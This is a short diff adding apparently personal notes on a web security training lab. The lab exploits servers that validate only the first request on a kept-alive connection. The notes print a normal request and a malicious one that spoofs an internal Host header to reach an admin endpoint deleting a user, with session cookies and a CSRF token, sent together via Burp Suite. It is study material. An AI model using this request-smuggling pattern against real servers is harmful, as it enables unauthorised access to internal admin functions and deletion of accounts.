@@ -1,0 +1,26 @@
+Thsi lab is based on servers only validating the first request from a client, after that if the connection is kept aliive
+all other requests are not validated.
+
+
+Therefore for this lab the requests:
+
+normal request:
+"
+GET / HTTP/1.1
+Host: 0aff007d04c9ba6b8124bb15009f0033.h1-web-security-academy.net
+Cookie: session=pNtKu9ZZ93xzOon36V9iuYBVGGEZrUhO; _lab=46%7cMCwCFHPdMf6f4KvRTeNvFJJvUzStYE0%2fAhQxAQf1MxISe%2fLsed9%2b6cd%2bWj6bXa9xwg7CahiydpRElRzf3vG48iU%2fL%2fdzwkNl%2ftkuBR0FGxkpNBr5c3pb%2f5ewFfy3mumnT%2fNQaP8HX3PKai1C0tV6MFAHBpxBm2NpDjv%2bLelEtWg%2bVNlR8KA%3d
+Connection: keep-alive
+"
+
+malicious request:
+"
+GET /admin/delete?username=carlos&csrf=dvoNdLiTTxmYjnALvXQ4Z8Iodwux9h8k HTTP/1.1
+Host: 192.168.0.1
+Cookie: session=pNtKu9ZZ93xzOon36V9iuYBVGGEZrUhO; _lab=46%7cMCwCFHPdMf6f4KvRTeNvFJJvUzStYE0%2fAhQxAQf1MxISe%2fLsed9%2b6cd%2bWj6bXa9xwg7CahiydpRElRzf3vG48iU%2fL%2fdzwkNl%2ftkuBR0FGxkpNBr5c3pb%2f5ewFfy3mumnT%2fNQaP8HX3PKai1C0tV6MFAHBpxBm2NpDjv%2bLelEtWg%2bVNlR8KA%3d
+Connection: keep-alive
+"
+
+
+
+When you send these in the same connection using the burp suite feature for sending requests in a single connection this allows for the 
+vulnerability to be Exploited
